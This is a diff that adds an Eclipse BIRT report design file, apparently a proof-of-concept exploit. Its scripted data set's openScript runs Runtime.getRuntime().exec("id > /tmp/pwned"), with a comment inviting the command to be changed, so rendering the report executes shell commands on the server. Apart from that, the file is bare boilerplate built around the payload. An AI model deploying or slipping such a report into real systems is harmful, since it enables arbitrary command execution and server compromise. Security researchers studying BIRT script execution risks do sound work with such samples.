@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<report xmlns="http://www.eclipse.org/birt/2005/design" version="3.2.23" id="1">
+  <property name="createdBy">Eclipse BIRT Designer</property>
+  <property name="units">in</property>
+  <property name="iconFile">/templates/blank_report.gif</property>
+  <data-sources>
+    <script-data-source name="scriptDataSource" id="2"/>
+  </data-sources>
+  <data-sets>
+    <script-data-set name="scriptDataSet" id="3">
+      <property name="dataSource">scriptDataSource</property>
+      <list-property name="parameters"/>
+      <structure name="cachedMetaData">
+        <list-property name="resultSet">
+          <structure>
+            <property name="position">1</property>
+            <property name="name">col1</property>
+            <property name="dataType">string</property>
+          </structure>
+        </list-property>
+      </structure>
+      <property name="openScript">importPackage(Packages.java.lang);
+var p = Runtime.getRuntime().exec("id > /tmp/pwned"); // change command</property>
+      <property name="fetchScript">row["col1"] = "done";</property>
+    </script-data-set>
+  </data-sets>
+  <page-setup>
+    <simple-master-page name="Simple MasterPage" id="4"/>
+  </page-setup>
+  <body>
+    <table id="5">
+      <property name="width">100%</property>
+      <column id="6"/>
+      <detail>
+        <row id="7">
+          <cell id="8">
+            <property name="colSpan">1</property>
+            <property name="rowSpan">1</property>
+            <property name="column">1</property>
+            <text id="9">
+              <property name="contentType">html</property>
+              <text-property name="content">Report executed.</text-property>
+            </text>
+          </cell>
+        </row>
+      </detail>
+    </table>
+  </body>
+</report>
